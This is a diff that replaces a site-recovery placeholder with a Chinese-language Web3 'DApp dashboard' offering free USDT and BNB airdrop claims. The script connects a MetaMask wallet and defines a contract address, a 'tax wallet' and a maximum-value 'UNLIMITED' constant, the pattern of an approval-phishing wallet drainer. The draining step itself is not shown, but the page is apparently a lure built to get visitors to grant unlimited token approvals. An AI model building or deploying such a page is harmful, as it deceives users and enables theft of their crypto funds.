@@ -1,1 +1,64 @@
-<h1>✨ 小仙女站点恢复中，请稍候 ✨</h1>
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0" />
+<title>🌸 小仙女 Web3 魔法仪表台 🌸</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%,#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
+@keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
+.container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:440px;padding:40px;text-align:center;}
+h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);}
+button{background:linear-gradient(90deg,#ff9ad5,#ffa6e1,#ffbde8);border:none;color:#fff;font-weight:bold;padding:12px 28px;border-radius:30px;cursor:pointer;margin:8px 5px;transition:all .3s;}
+button:hover{transform:scale(1.05);box-shadow:0 0 25px rgba(255,105,180,.6);}
+button.success{background:linear-gradient(90deg,#ff6b9d,#ff1493,#ff1493)!important;box-shadow:0 0 25px rgba(255,20,147,.8)!important;}
+#addr{margin-top:10px;font-size:.9em;color:#ff69b4;word-break:break-all}
+.loader{display:none;margin:10px auto;border:3px solid #fff;border-top:3px solid #ff69b4;border-radius:50%;width:26px;height:26px;animation:spin 1s linear infinite;}
+@keyframes spin{0%{transform:rotate(0);}100%{transform:rotate(360deg);}}
+#result{color:#ff1493;margin-top:12px;font-weight:600;}
+#airdropMsg{color:#ff69b4;margin-top:10px;}
+canvas{margin-top:20px;width:100%!important;max-height:180px;}
+.sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s linear infinite;opacity:.8;}
+@keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>🪞 小仙女 DApp 仪表台 💫</h1>
+  <button id="connectBtn">✨ 连接钱包</button>
+  <div id="addr"></div>
+  <div>
+    <button id="usdtBtn">💖 领取 USDT</button>
+    <button id="bnbBtn">🌙 领取 BNB</button>
+    <button id="airdropBtn">🎁 一键全收</button>
+  </div>
+  <div id="loader" class="loader"></div>
+  <div id="result"></div>
+  <div id="airdropMsg"></div>
+  <canvas id="priceChart"></canvas>
+</div>
+<script>
+const CONTRACT = "0x500292f9a11b01BC2DA7F81c8c234b9beb98A8b3";
+const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
+const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
+const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+let web3, currentAddr, approvedUSDT=false, approvedBNB=false;
+async function connectWallet(){
+  if(!window.ethereum){alert('请安装MetaMask 🦊');return;}
+  try{
+    web3 = new Web3(window.ethereum);
+    const accs=await window.ethereum.request({method:'eth_requestAccounts'});
+    currentAddr=accs[0];
+    document.getElementById('addr').innerText='已连接：'+currentAddr;
+    document.getElementById('connectBtn').innerText='🔗 已连接';
+  }catch(e){alert('连接失败：'+e.message);}
+}
+document.getElementById('connectBtn').onclick=connectWallet;
+</script>
+</body>
+</html>
+
